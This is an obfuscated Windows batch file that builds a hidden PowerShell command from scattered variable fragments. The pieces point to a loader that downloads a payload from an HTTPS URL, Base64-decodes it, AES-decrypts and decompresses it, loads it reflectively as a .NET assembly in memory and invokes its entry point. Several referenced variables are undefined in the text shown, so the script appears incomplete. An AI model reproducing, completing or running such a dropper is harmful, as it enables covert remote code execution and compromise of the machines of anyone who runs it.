@echo off
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "FBgtRxhvbb=64_A"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "cUoMNyuzQG=;e $"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "GvqLIgmjiA=ct I"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "eCEvuxyHSl=on.G"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "YSyXAYsHud=t]::"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "cznwysGPSj=ce('"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "bOWrrvicyh= 'ht"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "bEwCKfsXqC=ompr"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "evfPsWtFIq=s);$"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "cKASzewUxz=From"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "GYDtVVIhlx=nvok"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "xLBghxMyzK=.Cry"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "TDXVekjNHC=tion"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "vQRZaQoqha=ddin"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ujsoTYoLjg=-Hos"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "voxnYwVUyl=);$r"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "hWlsubNQef=Cont"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "bUMHIdXhiD=_AES"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "OwTEshyWea=/Pri"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "tSnsnMWvtp=KCS7"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "wBUXhbUKtj=tor("
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "YlMqDngkEc=omBa"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "oNJcncGjNt=tps:"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "wuqZzvOoXM=th);"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "oLXskNmqox=ad($"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "OAHFpVpjLn=ecti"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "oLvhfjEmPx=;$g."
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "gPATDGljhC=on z"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "yeehYzhagx=dows"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "wXFqeKRJsC= $p="
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "gKaLQubmNa=se()"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "aXLHJIaoYJ=w.gi"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "AvJgUZUZYU=ep.I"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "mCXVltsIZn=\';f"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ObCrkhUOAh=ose("
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "uMAVFQEvLb=se64"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "BDdZMIITIk=sfor"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ONxrlOSMZX=epla"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "FUBnIUewNi=d($b"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "mTUoZSbXeX=Some"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "uEMoByZbin=m($i"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "vzMvOgjKur=pres"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "bsldSEXhBl=ent."
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "JdGhJKcnAf=t]::"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "vQYRHMetmL=Tran"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "oyeuVxUcye=A'))"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "HEfrIbuuOW=e();"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "OsmnwBJAlN=,$b."
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "mlIrZmkAQa=.txt"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "aCJtpPKAFt=/')."
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "AWlbZdxzEx=f($e"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "KuSNQAXGFU=Refl"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "HVvfyTvhuK=user"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "dgGyXBQNGN==New"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "iBmKocbpUd=load"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "eXXrPpinFy=ZipS"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "bxfZiIEbYX=').R"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "dZzjlBonRu="%systemdrive%"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "FQyZEfBFiP=com/"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "oQMHQIHwaG=();$"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "TbPtUNbEnZ=pres"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "zKYosofjzR=(iwr"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "UPejELPoBY=Stre"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "jIzyoxfnrq=]::F"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "tSuEBaNVyF=te()"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "TxfMFCnEJe=$p[1"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "BJydInIgga=.Mem"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "uDXddMGfmn=sPow"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ebDhQiMUQP==$c."
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "aQncdsZaaA=;$a."
%rJOIAggkyK%%wXFqeKRJsC%%zKYosofjzR%%bOWrrvicyh%%oNJcncGjNt%%shsPXHLzpm%%aXLHJIaoYJ%%BOkloLbVbq%%HVvfyTvhuK%%JJNmgqcbtE%%bsldSEXhBl%%FQyZEfBFiP%%mTUoZSbXeX%%JZBwpoKsnU%%WoFieTkNHb%%OwTEshyWea%%CZcDCFocKq%%ujsoTYoLjg%%HopcjmgXeh%%PNnmrWlcGz%%EidrGEeFLt%%TNMYsoKZup%%zrYCAGWfWW%%MleKBzlYvE%%iBmKocbpUd%%mlIrZmkAQa%%IYIOGHIcwT%%dLDPgXfnoy%%FHlSJBDNKo%%oKhvWjSxdG%%tZSaaAHSkb%%hWlsubNQef%%eVrhFsDiTW%%fIjHeGOlSj%%TKCJhrzPbV%%wcsYCyHKvI%%WzZoWzMEnO%%mCXVltsIZn%%TOhYAcplfG%%YdPjmuLoMI%%FUBnIUewNi%%fZLiPisaNT%%jByHPjMNJQ%%IeVrHYmUqF%%YSyXAYsHud%%cKASzewUxz%%iqNWAaetAQ%%WxKiVqcBhQ%%QetFNXEcRD%%BswQxHfCwz%%UYhDhEasXi%%bUMHIdXhiD%%wbBWoDbTKn%%lAeHVRXPyj%%WmfJCGFPhu%%KXtTcTwkoD%%DgHJXBQfLR%%fiIZGkWSuI%%YlMqDngkEc%%uMAVFQEvLb%%QAeqoBpunS%%WEQGFruqgJ%%uFAIwsHNtP%%FBgtRxhvbb%%YMWMfQWTpn%%wopcGkavTV%%UBaymvxxPh%%kYoeLHINCG%%wNxftrmeMG%%xLBghxMyzK%%syeidxZkqY%%CmSnygdUeV%%jsLiJyxiXo%%VjnSnYJpcW%%sbONekTnHa%%tSuEBaNVyF%%aQncdsZaaA%%xORiChEXey%%FjBWUcPIrm%%kNQwWBOLKM%%lTngDFalbt%%vQRZaQoqha%%CqINqJYvmb%%tSnsnMWvtp%%cDHXRuWQwf%%mxEJjUkzQT%%GFZaaCCzMo%%TTXRYYJKWV%%NhYgOWoEis%%BxFzIwEGXo%%RxdiltzMKk%%lzCUgzGSme%%oYqtMwoxjC%%ucMIeqdQUu%%wBUXhbUKtj%%PLtTZTgKvP%%ebDhQiMUQP%%vQYRHMetmL%%BDdZMIITIk%%jtvfquYMhZ%%oaUDOZNClm%%ONyKnAXEvh%%zTlFGbvSBn%%OsmnwBJAlN%%VgHvvwULSP%%wuqZzvOoXM%%EUbYywBlnL%%QxsImsmPjj%%gKaLQubmNa%%MuCyjafIXY%%UJxgYYbIMg%%jZfNFTUpie%%voxnYwVUyl%%nDSkoxnTMR%%tsAGRNpOTp%%gPATDGljhC%%dhjBTFgUyh%%GaDqKdORvl%%ggajfxdZHI%%ldMjOmiZMm%%GvqLIgmjiA%%SuOWvXgavv%%ChnQWDotCy%%UPejELPoBY%%lTQgQRoPNQ%%fiDrJzizPe%%RSHJFcpFrK%%hRzxkIrgZe%%oyFMtMmNzf%%DqzwhtmhBN%%BJydInIgga%%hczLPtmVpT%%QCfmgRsdqR%%wjEmCFaCdg%%dgGyXBQNGN%%gqRHWZEmWR%%UFQpEYxnik%%tJSjPKVGoF%%bEwCKfsXqC%%aNFmlyprUZ%%eCEvuxyHSl%%eXXrPpinFy%%FAXGjFeFYr%%uEMoByZbin%%GKeeydQowV%%pcLvuDFYlO%%sSJAQzlIPq%%qhfsRUvShg%%PPjdcsSqUX%%TbPtUNbEnZ%%RhyfFhXtDz%%iMRfZCJGyy%%GVNSxpsLye%%TRFioHrdxU%%vzMvOgjKur%%evfPsWtFIq%%PlVzFrhJQr%%lFiDdgisdq%%fHqgZyLQPs%%oLvhfjEmPx%%ZAUdgzmCLl%%ObCrkhUOAh%%GqTxczjbyT%%BWCGrENnaA%%ljeDEnjeWX%%oQMHQIHwaG%%pldSKRyVZG%%tHOZWxmpTP%%peeAELkUQI%%XrntlZflTM%%OoeqEHcMLt%%wrCkqkgCoY%%HEfrIbuuOW%%rawhbbaOWW%%JxiwlGPcca%%TDXVekjNHC%%nHXPbwVujp%%ksFrpjvIfc%%mrsOdOcBdR%%SmguIcAtuP%%KuSNQAXGFU%%OAHFpVpjLn%%uurswXllIn%%JbnqrRzEXC%%RvVicrFBeM%%MqIhuqczqS%%oLXskNmqox%%wKljwYyjqf%%sKgVAttgWa%%OaofnfxCXo%%fomGqceyKw%%RTilAEEcSR%%ufunIwwgVr%%AWlbZdxzEx%%oUwziVRcEJ%%AvJgUZUZYU%%GYDtVVIhlx%%gfxvCzJUeN%%FtBmQfmeha%%iyBKRqrcEn%%mKQhCvXoDu%%pZVkpmwqCQ%%IDaloIDMDm%%iGqQAVCtJv%%hXBMKjDqvF%%TaAOEIJFTU%%RlLqmJJeJu%%JdGhJKcnAf%%fmrYtigClS%%lXAPDWmkAb%%zyHbVQtsfT%%GwfOPFTMXe%%DhSRiMCREM%%ySNzFGFqcD%%ONxrlOSMZX%%cznwysGPSj%%nBOsvOIGij%%aCJtpPKAFt%%UQSGJYEram%%ZPyTqmYeWx%%glDQXzPTgI%%IgjypwJiIw%%jqFVjkeQdc%%QFDinInbIk%%iLlsETGaET%%DQwznPGHHN%%vZPdRcCakG%%jIzyoxfnrq%%EemkzajeUy%%bGuVOjWhAC%%rFPXKUqXlQ%%JtqrjqMFDR%%TxfMFCnEJe%%BYMOZYppzE%%JlTeOIqdMx%%wqDIITzcrh%%HMogoLGBsk%%bxfZiIEbYX%%mkSlIkvdgf%%zmXsXWWMQd%%bPLBwYlEAa%%oyeuVxUcye%%qCvmKPANbl%%LRlUVxyqPJ%%ZQDfRbhCwA%%cUoMNyuzQG%%yyCpowmjyx%%YDmOezZpuJ%%IYqBjRCzhx%%dZzjlBonRu%%OXdZByHAHn%%yeehYzhagx%%TNcbuYedCD%%kMyZVKUrZK%%jcRTZYUskL%%tnhtBaVcED%%uDXddMGfmn%%FQbvnRWicw%%dLSRkXEeyU%%PSMwqGeOQm%%rPgXgCmMfK%%eNaizILgTf%%iBHryMdEfH%%MirPeoFVKH%
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "gtetjkxjgv=exit"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "HamLjiavhe= /b"
%gtetjkxjgv%%HamLjiavhe%
